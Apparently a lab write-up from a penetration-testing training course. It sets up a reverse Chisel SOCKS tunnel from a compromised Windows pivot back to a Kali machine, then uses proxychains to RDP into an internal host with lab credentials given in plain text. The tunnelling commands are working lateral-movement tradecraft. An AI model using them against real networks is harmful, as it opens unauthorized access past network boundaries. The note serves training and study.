# LAB — Pivoting With Chisel and SOCKS

## Setup

### Step 1 — Configure Proxychains

```bash
sudo gedit /etc/proxychains.conf
```

Add at the bottom (comment out any existing `socks4` line):

```
socks5 127.0.0.1 9050
```

### Step 2 — Start Chisel Server (Kali)

```bash
chisel server -p 8000 --reverse
```

### Step 3 — Start Chisel Client with SOCKS (Win1 / JMP2)

```cmd
chisel.exe client 10.150.74.18:8000 R:9050:socks
```

This creates a **SOCKS proxy at `127.0.0.1:9050` on Kali**. Dynamic port forwarding — not limited to a single target host or port.

### Step 4 — Use Proxychains to RDP into Target

```bash
proxychains xfreerdp /v:thmiis.za.tryhackme.com:3389 /u:t1_thomas.moore /p:MyPazzw3rd2020
```

## Critical Gotcha: Target Address with SOCKS

> [!CAUTION]
> When using dynamic SOCKS forwarding with Proxychains, specify the **actual target hostname/IP** — do NOT use `127.0.0.1`.
>
> - `proxychains xfreerdp /v:thmiis.za.tryhackme.com:3389` → ✅ Lands on **THM-IIS**
> - `proxychains xfreerdp /v:127.0.0.1:3389` → ❌ Lands on **THM-JMP2** (the pivot!)
>
> `127.0.0.1` loops back to the pivot machine, not the target.

## Quick Comparison: Single Forward vs SOCKS

| Approach | Chisel Client Command | Connect From Kali |
|---|---|---|
| **Single port** | `R:3389:thmiis:3389` | `xfreerdp /v:127.0.0.1:3389` |
| **SOCKS (dynamic)** | `R:9050:socks` | `proxychains xfreerdp /v:thmiis:3389` |

> [!TIP]
> Add `-q` to `proxychains` to suppress verbose proxy connection logs.
